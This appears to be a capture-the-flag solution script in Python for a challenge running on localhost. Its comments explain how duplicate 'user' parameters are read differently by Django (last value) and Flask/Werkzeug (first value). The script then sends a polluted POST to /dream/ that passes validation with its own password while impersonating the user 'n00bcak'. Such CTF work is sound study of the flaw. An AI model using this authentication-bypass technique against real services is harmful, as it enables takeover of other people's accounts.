# vulnerability is that when you POST to /dream/ with multiple usernames, validation is performed on the last user and password provided.
# this is because getting from a django querydict takes the last value of a key 
# however, the params passed to the flask app is in a werkzeug multidict
# getting from this multidict takes from the first value of a key by default

# 1. register as a user with a known password
# 2. logout to remove the session
# 3. access /dream/ while polluting the user

import requests

# arbitrary unused username and password
USERNAME = "elijah5399"
PASSWORD = "password"
HOST = "http://localhost:33067/"

register_url = HOST + "register/"
register_obj = {"user": USERNAME, "password": PASSWORD}
register_response = requests.post(register_url, data=register_obj)
print(f"register response: {register_response.text}")

logout_url = HOST + "logout/"
logout_response = requests.post(logout_url)
print(f"logout response: {logout_response.text}")

dream_url = HOST + "dream/"
dream_obj = {"user": ["n00bcak", USERNAME], "password": PASSWORD}
dream_response = requests.post(dream_url, data=dream_obj)
print(f"dream response: {dream_response.text}")